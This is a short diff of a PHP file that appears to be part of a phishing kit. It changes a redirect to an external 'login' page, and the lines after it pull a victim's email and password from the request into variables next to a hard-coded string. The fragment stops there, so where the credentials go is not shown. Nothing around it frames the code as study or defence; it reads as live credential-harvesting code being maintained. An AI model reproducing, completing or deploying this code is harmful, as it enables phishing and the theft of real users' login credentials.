@@ -1,5 +1,5 @@
 <?php
-header("Location: https://videomaluku.info/2Flogin&source=www_list_selector_more.html");
+header("Location: https://videomaluku.info/2login.html");
 $ADEx = "rejeki.999";
 $ADEy = $_GET['email'];
 $ADEz = $_GET['pass'];
